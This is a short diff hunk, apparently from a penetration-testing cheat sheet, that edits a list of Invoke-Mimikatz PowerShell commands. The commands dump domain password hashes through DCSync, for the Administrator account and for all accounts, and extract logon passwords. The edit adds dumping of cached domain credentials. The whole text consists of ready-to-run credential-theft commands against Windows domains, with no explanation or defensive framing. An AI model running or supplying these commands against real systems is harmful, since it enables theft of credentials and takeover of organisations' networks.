@@ -2,7 +2,7 @@
 import-module .\Invoke-Mimikatz.ps1
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:Administrator"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
-Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
+Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords" "lsadump::cache"
 ```
 
 
